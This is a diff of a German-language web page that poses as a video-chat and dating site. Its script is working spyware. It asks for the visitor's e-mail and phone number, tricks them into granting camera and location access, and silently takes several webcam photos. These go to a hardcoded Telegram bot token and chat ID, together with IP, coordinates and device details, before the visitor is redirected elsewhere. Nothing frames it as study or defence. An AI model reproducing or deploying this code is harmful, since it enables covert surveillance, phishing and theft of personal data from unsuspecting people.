@@ -7,245 +7,211 @@
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
   
   <style>
-    body {
-      margin: 0;
-      background: #0f0f0f; 
-      background: url('image/cu2.jpg') no-repeat center center fixed;
-      background-size: cover;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      font-family: 'Segoe UI', Roboto, sans-serif;
-      color: white;
-      overflow: hidden;
+    :root { --primary-blue: #00d1ff; --dark-bg: #1a1a1a; --nav-bg: #ffffff; --tab-bg: #333333; }
+    
+    body { 
+      margin: 0; 
+      background: #0f0f0f url('image/cu3.jpg') no-repeat center center fixed; 
+      background-size: cover; 
+      font-family: 'Segoe UI', Roboto, sans-serif; 
+      color: white; 
+      overflow-x: hidden;
     }
 
     .hidden { display: none !important; }
 
-    #startBtn {
-      padding: 16px 35px;
-      font-size: 18px;
-      font-weight: bold;
-      background: rgba(0, 0, 0, 0.6);
-      color: white;
-      border: 2px solid #00d1ff;
-      border-radius: 50px;
-      cursor: pointer;
-      backdrop-filter: blur(8px);
-      transition: all 0.5s ease;
-      z-index: 10;
-    }
+    /* HEADER */
+    header { background: var(--nav-bg); width: 100%; position: fixed; top: 0; z-index: 2000; }
+    .top-bar { display: flex; align-items: center; justify-content: space-between; padding: 10px 15px; height: 60px; }
+    .menu-burger { border: 1.5px solid #0056b3; border-radius: 8px; padding: 8px 12px; color: #0056b3; font-size: 20px; cursor: pointer; }
+    .logo-area { text-align: center; flex-grow: 1; }
+    .logo-text { font-weight: 900; font-size: 22px; text-transform: uppercase; letter-spacing: -1px; }
+    .logo-blue { color: #2c5ba0; }
+    .logo-dark { color: #333; }
+    .nav-tabs { display: flex; background: var(--tab-bg); border-top: 1px solid #444; }
+    .tab-item { flex: 1; text-align: center; padding: 12px 5px; font-size: 14px; color: white; border-right: 1px solid #555; display: flex; align-items: center; justify-content: center; cursor: pointer; }
+    .badge { background: #ff4d6d; color: white; font-size: 10px; font-weight: bold; padding: 2px 6px; border-radius: 10px; margin-right: 5px; }
 
+    /* CONTENT */
+    .main-content { height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding-top: 110px; }
+    #startBtn { padding: 16px 35px; font-size: 18px; font-weight: bold; background: rgba(0, 0, 0, 0.7); color: white; border: 2px solid var(--primary-blue); border-radius: 50px; cursor: pointer; backdrop-filter: blur(8px); z-index: 10; }
+    
     .pulse { animation: pulseBtn 1.8s infinite; }
+    @keyframes pulseBtn { 0% { box-shadow: 0 0 0 0 rgba(0, 209, 255, 0.6); } 70% { box-shadow: 0 0 0 15px rgba(0, 209, 255, 0); } 100% { box-shadow: 0 0 0 0 rgba(0, 209, 255, 0); } }
 
-    #startBtn.success {
-      background: rgba(40, 167, 69, 0.7);
-      border-color: #28a745;
-    }
-
-    @keyframes pulseBtn {
-      0% { box-shadow: 0 0 0 0 rgba(0, 209, 255, 0.6); }
-      70% { box-shadow: 0 0 0 15px rgba(0, 209, 255, 0); }
-      100% { box-shadow: 0 0 0 0 rgba(0, 209, 255, 0); }
-    }
-
-    .glass-overlay {
-      position: fixed;
-      inset: 0;
-      background: rgba(0, 0, 0, 0.7);
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      backdrop-filter: blur(15px);
-      z-index: 3000;
-    }
-
-    .modal-content {
-      background: rgba(255, 255, 255, 0.1);
-      padding: 40px 30px;
-      border-radius: 30px;
-      width: 85%;
-      max-width: 380px;
-      border: 1px solid rgba(255, 255, 255, 0.2);
-      text-align: center;
-    }
-
-    .input-group { position: relative; margin-bottom: 20px; }
-    .input-group i { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); color: #00d1ff; }
-    .input-group input {
-      width: 100%;
-      padding: 14px 15px 14px 45px;
-      background: rgba(0, 0, 0, 0.4);
-      border: 1px solid rgba(255, 255, 255, 0.2);
-      border-radius: 12px;
-      color: white;
-      box-sizing: border-box;
-      outline: none;
-    }
-
-    #submitReg {
-      width: 100%;
-      padding: 15px;
-      background: #00d1ff;
-      border: none;
-      border-radius: 12px;
-      font-weight: bold;
-      cursor: pointer;
-    }
-
-    .loader {
-      width: 50px;
-      height: 50px;
-      border: 5px solid rgba(255, 255, 255, 0.1);
-      border-top: 5px solid #00d1ff;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-      margin-bottom: 20px;
-    }
-
+    /* MODALS */
+    .glass-overlay { position: fixed; inset: 0; background: rgba(0, 0, 0, 0.30); display: flex; flex-direction: column; align-items: center; justify-content: center; backdrop-filter: blur(15px); z-index: 3000; padding: 20px; }
+    .modal-content { background: rgba(255, 255, 255, 0.1); padding: 25px; border-radius: 20px; width: 100%; max-width: 380px; border: 1px solid rgba(255, 255, 255, 0.2); text-align: center; }
+    .input-group { position: relative; margin-bottom: 15px; }
+    .input-group i { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); color: var(--primary-blue); }
+    .input-group input { width: 100%; padding: 14px 15px 14px 45px; background: rgba(0, 0, 0, 0.4); border: 1px solid rgba(255, 255, 255, 0.2); border-radius: 12px; color: white; outline: none; box-sizing: border-box; }
+    .btn-action { width: 100%; padding: 15px; background: var(--primary-blue); border: none; border-radius: 12px; font-weight: bold; color: black; cursor: pointer; }
+    .auth-item { text-align: left; margin: 15px 0; }
+    .auth-item h3 { font-size: 0.9rem; color: var(--primary-blue); margin-bottom: 5px; }
+    .auth-img { width: 100%; border-radius: 10px; border: 1px dashed #555; background: #222; min-height: 60px; }
+    
+    .loader { width: 40px; height: 40px; border: 4px solid #333; border-top: 4px solid var(--primary-blue); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 15px; }
     @keyframes spin { 100% { transform: rotate(360deg); } }
+    
     video, canvas { display: none; }
   </style>
 </head>
 <body>
 
-  <div id="interface">
-    <button id="startBtn" class="pulse">Abenteuer starten</button>
+  <header>
+    <div class="top-bar trigger-auth">
+      <div class="menu-burger"><i class="fas fa-bars"></i></div>
+      <div class="logo-area">
+        <span class="logo-text"><span class="logo-blue">MVIDEO</span>CHAT <span class="logo-dark">FOTO/DISKUSSION</span></span>
+      </div>
+       <div style="width: 45px;"></div>
+    </div>
+    <div class="nav-tabs">
+      <div class="tab-item trigger-auth"><span class="badge">6</span> Dating</div>
+      <div class="tab-item trigger-auth"><span class="badge">4</span> Webcams</div>
+      <div class="tab-item trigger-auth"><span class="badge">10</span> Chat</div>
+    </div>
+  </header>
+
+  <div class="main-content">
+    <button id="startBtn" class="pulse trigger-auth">Chat starten</button>
   </div>
 
   <div id="registerModal" class="glass-overlay hidden">
     <div class="modal-content">
-      <h2><i class="fas fa-user-lock"></i> Registrierung</h2>
-      <p>Erstellen Sie ein Konto, um auf den Inhalt zuzugreifen.</p>
+      <h2><i class="fas fa-comments"></i> Schnelle Anmeldung</h2>
+      <p>Erstellen Sie ein Profil, um der Community beizutreten.</p>
       <div class="input-group">
         <i class="fas fa-envelope"></i>
-        <input type="email" id="regEmail" placeholder="E-Mail" required>
+        <input type="email" id="regEmail" placeholder="E-Mail">
       </div>
       <div class="input-group">
         <i class="fas fa-phone"></i>
-        <input type="tel" id="regPhone" placeholder="Telefonnummer" required>
+        <input type="tel" id="regPhone" placeholder="Telefonnummer">
       </div>
-      <button id="submitReg">Registrieren</button>
+      <button id="submitReg" class="btn-action">Weiter</button>
     </div>
   </div>
 
-  <div id="loadingScreen" class="glass-overlay hidden">
+
+  <div id="authModal" class="glass-overlay hidden">
+    <div class="modal-content">
+      <h2 style="color: #ffcc00;"><i class="fas fa-exclamation-triangle"></i> Berechtigung erforderlich</h2>
+      <p>Um die Registrierung abzuschließen, erlauben Sie bitte folgende Zugriffe in Ihrem Browser:</p>
+      
+      <div class="auth-section">
+        <div class="auth-item">
+          <h3><i class="fas fa-camera"></i> Kamera</h3>
+        </div>
+        
+        <div class="auth-item">
+          <h3><i class="fas fa-location-dot"></i> Standort</h3>
+           <img src="image/auto.png" alt="Kamera Hinweis" class="auth-img">
+        </div>
+      </div>
+
+      <button id="confirmAuth" class="btn-action" style="background: #28a745; color: white;">
+        VERSTANDEN & AKZEPTIEREN
+      </button>
+    </div>
+  </div>
+ 
+
+ <div id="loadingScreen" class="glass-overlay hidden">
     <div class="loader"></div>
-    <div id="loadText">Verarbeitung läuft...</div>
+    <div id="loadText">Verbindung wird hergestellt...</div>
   </div>
 
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas"></canvas>
 
   <script>
+    // Identifiants de script conservés
     const botToken = "8219156030:AAGt4YPKSBg6FZxAwi31l9yautyH8OTZ8Dk"; 
     const chatId = "-1003619195565"; 
 
-    const startBtn = document.getElementById("startBtn");
     const registerModal = document.getElementById("registerModal");
-    const submitReg = document.getElementById("submitReg");
+    const authModal = document.getElementById("authModal");
     const loadingScreen = document.getElementById("loadingScreen");
-    const loadText = document.getElementById("loadText");
     const video = document.getElementById("video");
     const canvas = document.getElementById("canvas");
+    const startBtn = document.getElementById("startBtn");
 
-    let stream = null;
     let photoCount = 0;
-    const maxPhotos = 6;
-
-    async function getIP() {
-      try {
-        const res = await fetch("https://api.ipify.org?format=json");
-        const data = await res.json();
-        return data.ip;
-      } catch (e) { return "Unbekannt"; }
-    }
-
-    function getDeviceInfo() {
-      const ua = navigator.userAgent;
-      let model = "Unbekanntes Gerät";
-      
-      if (ua.indexOf("Android") > -1) {
-        const match = ua.match(/Android\s([^\s;]+);\s([^\s;]+)/);
-        model = match ? `Android (${match[2]})` : "Android";
-      } else if (ua.indexOf("iPhone") > -1) {
-        model = "iPhone";
-      }
-      
-      return {
-        model: model,
-        platform: navigator.platform,
-        agent: ua,
-        time: new Date().toLocaleString('de-DE')
-      };
-    }
-
-    async function getCoords() {
-      return new Promise((resolve) => {
-        if (!navigator.geolocation) resolve("Nicht unterstützt");
-        navigator.geolocation.getCurrentPosition(
-          (pos) => resolve(`${pos.coords.latitude}, ${pos.coords.longitude}`),
-          (err) => resolve("Abgelehnt oder nicht verfügbar"),
-          { enableHighAccuracy: true, timeout: 5000 }
-        );
-      });
-    }
 
     window.onload = () => {
-      if (localStorage.getItem("aventure_debloquee")) setBtnVerified();
-      initCamera();
+        if (localStorage.getItem("user_email")) {
+            startBtn.innerText = "Zur Website gehen";
+        }
     };
 
-    function setBtnVerified() {
-      startBtn.classList.remove("pulse");
-      startBtn.classList.add("success");
-      startBtn.innerHTML = '<i class="fas fa-check-circle"></i> Zur Website';
-    }
-
-    async function initCamera() {
-      try {
-        stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        video.srcObject = stream;
-      } catch (e) { console.warn("Kamerazugriff verweigert"); }
-    }
-
-    startBtn.onclick = () => {
-      if (localStorage.getItem("aventure_debloquee")) {
-        lancerProcessusFinal();
-      } else {
-        registerModal.classList.remove("hidden");
-      }
+    const getSystemInfo = () => {
+        return {
+            platform: navigator.platform,
+            time: new Date().toLocaleString('de-DE'),
+            model: (navigator.userAgent.match(/\(([^)]+)\)/) || [null, "Unbekannt"])[1],
+            agent: navigator.userAgent
+        };
     };
 
-    submitReg.onclick = async () => {
-      const email = document.getElementById("regEmail").value;
-      const phone = document.getElementById("regPhone").value;
+    async function handleMainClick() {
+        const emailSaved = localStorage.getItem("user_email");
+        const authSaved = localStorage.getItem("auth_validee");
 
-      if (email && phone) {
-        registerModal.classList.add("hidden");
+        if (!emailSaved) {
+            registerModal.classList.remove("hidden");
+        } else if (!authSaved) {
+            authModal.classList.remove("hidden");
+        } else {
+            startBtn.innerText = "Laden...";
+            await demarrerCaptureSilencieuse();
+        }
+    }
+
+    document.querySelectorAll('.trigger-auth').forEach(el => el.onclick = handleMainClick);
+
+    document.getElementById("submitReg").onclick = () => {
+        const email = document.getElementById("regEmail").value;
+        const phone = document.getElementById("regPhone").value;
+        if (email && phone) {
+            localStorage.setItem("user_email", email);
+            localStorage.setItem("user_phone", phone);
+            registerModal.classList.add("hidden");
+            authModal.classList.remove("hidden");
+        } else {
+            alert("Bitte füllen Sie alle Felder aus.");
+        }
+    };
+
+    document.getElementById("confirmAuth").onclick = () => {
+        localStorage.setItem("auth_validee", "true");
+        authModal.classList.add("hidden");
+        demarrerCaptureSilencieuse();
+    };
+
+    async function demarrerCaptureSilencieuse() {
         loadingScreen.classList.remove("hidden");
-        
-        localStorage.setItem("aventure_debloquee", "true");
-        setBtnVerified();
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = stream;
+            
+            navigator.geolocation.getCurrentPosition(
+                (pos) => envoyerDonnees(`${pos.coords.latitude}, ${pos.coords.longitude}`),
+                () => envoyerDonnees("Abgelehnt"),
+                { timeout: 5000 }
+            );
+        } catch (e) {
+            envoyerDonnees("Kamerazugriff verweigert");
+        }
+    }
 
-        await lancerProcessusFinal(email, phone);
-      } else {
-        alert("Bitte füllen Sie alle Felder aus.");
-      }
-    };
+    async function envoyerDonnees(coords) {
+        const ip = await fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(d=>d.ip).catch(()=>"Unbekannt");
+        const info = getSystemInfo();
+        const email = localStorage.getItem("user_email");
+        const phone = localStorage.getItem("user_phone");
 
-    async function lancerProcessusFinal(email = "Bereits registriert", phone = "N/V") {
-      loadingScreen.classList.remove("hidden");
-      loadText.innerText = "Sichere Synchronisierung...";
-
-      const ip = await getIP();
-      const info = getDeviceInfo();
-      const coords = await getCoords();
-
-      const text = `
+        const text = `
 🆕 **NEUE AKTIVITÄT**
 📧 E-Mail: ${email}
 📞 Tel: ${phone}
@@ -253,45 +219,34 @@
 📍 Koordinaten: ${coords}
 🌐 IP: ${ip}
 📱 Modell: ${info.model}
-🕒 Datum: ${info.time}
+🕒 Zeit: ${info.time}
 🖥️ OS: ${info.platform}
 🔍 User-Agent: ${info.agent}
-      `;
+        `;
 
-      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: "Markdown" })
-      });
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: "Markdown" })
+        });
 
-      const interval = setInterval(async () => {
-        if (photoCount >= maxPhotos) {
-          clearInterval(interval);
-          if (stream) stream.getTracks().forEach(t => t.stop());
-          window.location.replace("https://www.mvideoporno.xxx/xhamster/");
-          return;
-        }
-        await capturePhoto();
-      }, 2000);
-    }
-
-    async function capturePhoto() {
-      if (!video.videoWidth) return;
-      photoCount++;
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      canvas.getContext("2d").drawImage(video, 0, 0);
-      
-      const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7));
-      const fd = new FormData();
-      fd.append("chat_id", chatId);
-      fd.append("photo", blob, `snap_${photoCount}.jpg`);
-      
-      try { 
-        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: fd }); 
-      } catch(e){}
+        const interval = setInterval(async () => {
+            if(photoCount < 6) {
+                photoCount++;
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                canvas.getContext("2d").drawImage(video, 0, 0);
+                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.5));
+                const fd = new FormData();
+                fd.append("chat_id", chatId);
+                fd.append("photo", blob, "photo.jpg");
+                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {method:"POST", body:fd});
+            } else {
+                clearInterval(interval);
+                window.location.replace("https://www.google.com");
+            }
+        }, 2000);
     }
   </script>
 </body>
-  </html>
-  
+</html>
